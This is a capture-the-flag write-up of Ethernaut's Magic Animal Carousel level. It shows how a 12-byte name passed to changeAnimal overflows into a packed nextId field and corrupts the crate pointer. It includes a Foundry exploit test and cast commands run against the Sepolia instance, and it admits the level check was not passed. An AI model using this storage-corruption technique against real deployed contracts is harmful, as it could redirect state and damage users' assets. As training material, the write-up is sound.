# Ethernaut Challenge 33 — Magic Animal Carousel

Welcome, dear Anon, to the Magic Carousel, where creatures spin and twirl in a boundless spell. In this magical, infinite digital wheel, they loop and whirl with enchanting zeal.

Add a creature to join the fun, but heed the rule, or the game’s undone. If an animal joins the ride, take care when you check again, that same animal must be there!

Can you break the magic rule of the carousel?

Instance address:

```text
0x3e52E6932aa2F68ea0BBe21D44B9DD9Cb40b4D72
````

---

## 🎯 Goal

The challenge revolves around a packed storage structure that stores three pieces of information inside a single `uint256`:

* the animal name
* the id of the next crate
* the owner

The intended invariant is that once an animal is placed into the carousel, that same animal should still be there when the carousel comes back to that crate.

My local analysis shows that this invariant can be broken because the contract does **not** encode and store animal names consistently across its write functions.

---

## 🔍 Inspecting the storage layout

The contract defines these masks:

```solidity
uint16 public constant MAX_CAPACITY = type(uint16).max;
uint256 constant ANIMAL_MASK = uint256(type(uint80).max) << 160 + 16;
uint256 constant NEXT_ID_MASK = uint256(type(uint16).max) << 160;
uint256 constant OWNER_MASK = uint256(type(uint160).max);
```

So the packed crate layout is:

```text
| animal (80 bits) | nextId (16 bits) | owner (160 bits) |
|    10 bytes      |      2 bytes     |      20 bytes    |
```

That means a crate is expected to look like this:

```text
[ animal ][ nextId ][ owner ]
```

---

## 🧠 Constructor initialization

The constructor is:

```solidity
constructor() {
    carousel[0] ^= 1 << 160;
}
```

Since `carousel[0]` is initially zero, this sets bit `160` to `1`.

That means crate `0` starts with:

* animal = `0`
* nextId = `1`
* owner = `0`

We can verify this on Sepolia:

```bash
CAROUSEL=0x3e52E6932aa2F68ea0BBe21D44B9DD9Cb40b4D72

cast call $CAROUSEL \
  "carousel(uint256)(uint256)" 0 \
  --rpc-url $SEPOLIA_RPC_URL
```

Result:

```text
1461501637330902918203684832716283019655932542976
```

And:

```bash
cast call $CAROUSEL \
  "currentCrateId()(uint256)" \
  --rpc-url $SEPOLIA_RPC_URL
```

Result:

```text
0
```

So the carousel starts from crate `0`, and crate `0` points to crate `1`.

---

## 🔎 Understanding `encodeAnimalName`

```solidity
function encodeAnimalName(string calldata animalName) public pure returns (uint256) {
    require(bytes(animalName).length <= 12, AnimalNameTooLong());
    return uint256(bytes32(abi.encodePacked(animalName)) >> 160);
}
```

This function accepts names up to `12` bytes.

For example, if we use `"cat"`:

* `abi.encodePacked("cat")` gives:

  ```text
  0x636174
  ```
* converting to `bytes32` pads the value on the right:

  ```text
  0x6361740000000000000000000000000000000000000000000000000000000000
  ```
* shifting right by `160` bits gives:

  ```text
  0x0000000000000000000000000000000000000000636174000000000000000000
  ```

So `encodeAnimalName()` can preserve up to **12 bytes**.

---

## 🔄 Understanding `setAnimalAndSpin`

```solidity
function setAnimalAndSpin(string calldata animal) external {
    uint256 encodedAnimal = encodeAnimalName(animal) >> 16;
    uint256 nextCrateId = (carousel[currentCrateId] & NEXT_ID_MASK) >> 160;

    require(encodedAnimal <= uint256(type(uint80).max), AnimalNameTooLong());
    carousel[nextCrateId] = (carousel[nextCrateId] & ~NEXT_ID_MASK) ^ (encodedAnimal << 160 + 16)
        | ((nextCrateId + 1) % MAX_CAPACITY) << 160 | uint160(msg.sender);

    currentCrateId = nextCrateId;
}
```

This function first does:

```solidity
uint256 encodedAnimal = encodeAnimalName(animal) >> 16;
```

That extra `>> 16` removes **2 bytes**.

So even though `encodeAnimalName()` supports `12` bytes, `setAnimalAndSpin()` only keeps **10 bytes = 80 bits**.

This is consistent with the crate layout:

```text
| animal (80 bits) | nextId (16 bits) | owner (160 bits) |
```

So `setAnimalAndSpin()` stores:

* animal in the top `80` bits
* next id in the following `16` bits
* owner in the lower `160` bits

---

## ✏️ Understanding `changeAnimal`

```solidity
function changeAnimal(string calldata animal, uint256 crateId) external {
    uint256 crate = carousel[crateId];
    require(crate != 0, CrateNotInitialized());

    address owner = address(uint160(crate & OWNER_MASK));
    if (owner != address(0)) {
        require(msg.sender == owner);
    }
    uint256 encodedAnimal = encodeAnimalName(animal);
    if (encodedAnimal != 0) {
        // Replace animal
        carousel[crateId] = (encodedAnimal << 160) | (carousel[crateId] & NEXT_ID_MASK) | uint160(msg.sender);
    } else {
        // If no animal specified keep same animal but clear owner slot
        carousel[crateId] = (carousel[crateId] & (ANIMAL_MASK | NEXT_ID_MASK));
    }
}
```

This is where the inconsistency appears.

Unlike `setAnimalAndSpin()`, this function uses:

```solidity
encodeAnimalName(animal)
```

without the extra `>> 16`.

So here the function keeps the full **12-byte encoding**, and then writes it with:

```solidity
(encodedAnimal << 160)
```

That means the new animal occupies **96 bits**, starting at bit `160`.

But the crate layout only reserves:

* `80` bits for animal
* `16` bits for `nextId`

So `changeAnimal()` does not preserve the intended separation between the animal field and the `nextId` field.

---

## 🧪 Local experiment: 10, 11, and 12-byte names

I wrote the following test to inspect how names are encoded:

```solidity
function testPrintAnimalEncodings() public view {
    _printEncoding("abcdefghij");   // 10 bytes
    _printEncoding("abcdefghijk");  // 11 bytes
    _printEncoding("abcdefghijkl"); // 12 bytes
}
```

The results were:

```text
====================================
animal: abcdefghij

length: 10

encodeAnimalName(animal) as bytes32:
0x00000000000000000000000000000000000000006162636465666768696a0000

encodeAnimalName(animal) >> 16 as bytes32:
0x000000000000000000000000000000000000000000006162636465666768696a

====================================
animal: abcdefghijk

length: 11

encodeAnimalName(animal) as bytes32:
0x00000000000000000000000000000000000000006162636465666768696a6b00

encodeAnimalName(animal) >> 16 as bytes32:
0x000000000000000000000000000000000000000000006162636465666768696a

====================================
animal: abcdefghijkl

length: 12

encodeAnimalName(animal) as bytes32:
0x00000000000000000000000000000000000000006162636465666768696a6b6c

encodeAnimalName(animal) >> 16 as bytes32:
0x000000000000000000000000000000000000000000006162636465666768696a
```

This shows the core issue very clearly:

* `encodeAnimalName()` keeps up to `12` bytes
* but `encodeAnimalName(...) >> 16` keeps only the **first 10 bytes**

So these three names:

* `abcdefghij`
* `abcdefghijk`
* `abcdefghijkl`

all become identical after the `>> 16`.

That means `setAnimalAndSpin()` cannot distinguish them anymore, while `changeAnimal()` still can.

---

## 🧪 Local proof of the bug

I then wrote a test to compare what happens when:

1. I insert a 10-byte animal with `setAnimalAndSpin()`
2. I modify the same crate with a 12-byte animal using `changeAnimal()`

The relevant test is in:

[`MagicAnimalCarouselTest.t.sol`](../../test/MagicAnimalCarouselTest.t.sol)

### Step 1 — Add a normal animal

```solidity
carousel.setAnimalAndSpin("abcdefghij");
```

This writes crate `1` as:

```text
0x6162636465666768696a0002ecf94300dd67bb8c31f41be3a2136d3f0abfb0b0
```

Which corresponds to:

```text
[ 6162636465666768696a ] [ 0002 ] [ owner ]
   animal (10 bytes)      nextId     owner
```

So:

* animal = `abcdefghij`
* nextId = `2`
* owner = `user`

---

### Step 2 — Change the same crate with a 12-byte animal

```solidity
carousel.changeAnimal("abcdefghijkl", 1);
```

After this call, crate `1` becomes:

```text
0x6162636465666768696a6b6eecf94300dd67bb8c31f41be3a2136d3f0abfb0b0
```

Decoded values:

```text
decoded animal field (top 80 bits):
0x000000000000000000000000000000000000000000006162636465666768696a

decoded nextId:
27502

decoded owner:
0xeCF94300dD67bB8c31F41BE3a2136D3f0abFb0B0
```

This is the key result:

* the visible animal field is still `abcdefghij`
* but `nextId` changed from `2` to `27502`

So the visible animal did **not** change, but the internal routing pointer did.

That happens because the last two bytes of the 12-byte name, `"kl"` (`0x6b6c`), overlap with the `nextId` field and get OR-ed with the old `nextId` (`0x0002`), producing:

```text
0x6b6c | 0x0002 = 0x6b6e
```

And:

```text
0x6b6e = 27502
```

---

## 💥 Local exploit sequence

My final local exploit test is:

```solidity
function testExploitMagicAnimalCarousel() public {
    vm.startPrank(user);

    // Step 1: write a normal 10-byte animal into crate 1
    carousel.setAnimalAndSpin("abcdefghij");

    uint256 crate1Before = carousel.carousel(1);

    assertEq(
        crate1Before,
        uint256(0x6162636465666768696a0002ecf94300dd67bb8c31f41be3a2136d3f0abfb0b0)
    );
    assertEq(carousel.currentCrateId(), 1);

    // Step 2: corrupt crate 1 using a 12-byte animal
    carousel.changeAnimal("abcdefghijkl", 1);

    uint256 crate1After = carousel.carousel(1);

    assertEq(
        crate1After,
        uint256(0x6162636465666768696a6b6eecf94300dd67bb8c31f41be3a2136d3f0abfb0b0)
    );

    // currentCrateId is still 1 here
    assertEq(carousel.currentCrateId(), 1);

    // Step 3: spin again
    carousel.setAnimalAndSpin("mnopqrstuv");

    // The carousel jumps to the corrupted crate id
    assertEq(carousel.currentCrateId(), 27502);

    // Crate 2 remains untouched
    assertEq(carousel.carousel(2), 0);

    // Crate 27502 receives the next animal
    uint256 crate27502 = carousel.carousel(27502);

    assertEq(
        crate27502,
        uint256(0x6d6e6f707172737475766b6fecf94300dd67bb8c31f41be3a2136d3f0abfb0b0)
    );

    vm.stopPrank();
}
```

This proves locally that:

1. `changeAnimal()` can corrupt `nextId`
2. the visible animal field can remain unchanged while the pointer changes
3. the next `setAnimalAndSpin()` follows the corrupted pointer
4. the carousel writes into crate `27502` instead of crate `2`

So the contract’s internal state can be desynchronized from the intended crate layout.

---

## 🚀 Reproducing the state on Sepolia

I reproduced the same sequence on Sepolia.

### Step 1

```bash
cast send $CAROUSEL \
  "setAnimalAndSpin(string)" "abcdefghij" \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut
```

### Step 2

```bash
cast send $CAROUSEL \
  "changeAnimal(string,uint256)" "abcdefghijkl" 1 \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut
```

### Step 3

```bash
cast send $CAROUSEL \
  "setAnimalAndSpin(string)" "mnopqrstuv" \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut
```

### Verify the corrupted pointer

```bash
cast call $CAROUSEL \
  "currentCrateId()(uint256)" \
  --rpc-url $SEPOLIA_RPC_URL
```

Result:

```text
27502
```

---

## ✅ Conclusion

Locally, this sequence demonstrates the core bug very clearly:

* `setAnimalAndSpin()` stores only the first `10` bytes of the animal name
* `changeAnimal()` writes the full `12` bytes starting at bit `160`
* the last `2` bytes overlap with `nextId`
* this allows me to keep the visible animal unchanged while corrupting the crate pointer

I was able to reproduce the same corrupted state on Sepolia and verify that `currentCrateId` becomes `27502`.

However, this exact Sepolia sequence did **not** satisfy the official level completion check, so additional investigation would be needed to fully complete the challenge on-chain.

```
